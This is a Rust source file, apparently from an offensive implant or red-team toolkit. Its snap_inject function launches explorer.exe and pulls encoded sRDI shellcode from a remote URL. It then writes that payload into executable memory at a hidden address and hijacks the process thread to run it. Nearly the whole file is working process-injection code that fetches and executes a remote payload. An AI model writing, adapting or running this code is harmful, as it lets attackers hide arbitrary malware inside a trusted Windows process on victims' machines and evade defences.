use winapi::um::{processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOA}, 
    winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS}};
    use winapi::um::processthreadsapi::CreateProcessA;

use crate::namoracore::snapcore::*;
use crate::stager;

pub fn snap_inject(args: Vec<String>) -> Result<(), String> {
    
    //parse the arguments
    let payload_url = match args.get(1) {
        Some(url) => url,
        None => {
            println!("{}", "[-] Usage: snap_inject <payload_url>");
            return Err("Invalid arguments".to_string());
        }
    };
    
    let process_name = "explorer.exe";
    //fromat the process path
    let mut process_path = if process_name.contains('\\') {
        format!("C:\\Windows\\System32\\{}", process_name)
    } else {
        process_name.to_string()
    };


    //create the startup info and process info structs
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    //create the process
    let success = unsafe {
        CreateProcessA(
            std::ptr::null(),
            process_path.as_mut_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1,
            NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };

    if success == 0 {
        return Err(format!("Failed to create process: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        }));
    }

    let process_handle = pi.hProcess;

     //We should get encoded shellcode from url
    // We should get encoded shellcode from url
    let data = match payload_url.starts_with("http://") || payload_url.starts_with("https://") {
        true => stager::fetch_payload(&payload_url),
        false => Err("URL must start with http:// or https://".to_string()),
    }; // Propagate the error if any

    //put the data in srdi
    let srdi = match data {
        Ok(dat) => dat,
        Err(e) => panic!("Could not get srdi: {}", e),
    };

    let srdi_size = srdi.len();

    let srdi_location = get_hidden_injection_address(process_handle, srdi_size)
        .map_err(|e| format!("Could not get srdi location: {}", e))?;

    if !inject_rwx(process_handle, srdi_location, &srdi) {
        return Err("Could not inject srdi".to_string());
    }

    if !snap_thread_hijack(
        pi.dwProcessId,
        pi.hThread,
        pi.dwThreadId,
        process_handle,
        Some(srdi_location),
        None,
    ) {
        return Err("Could not hijack thread".to_string());
    }

    Ok(())


}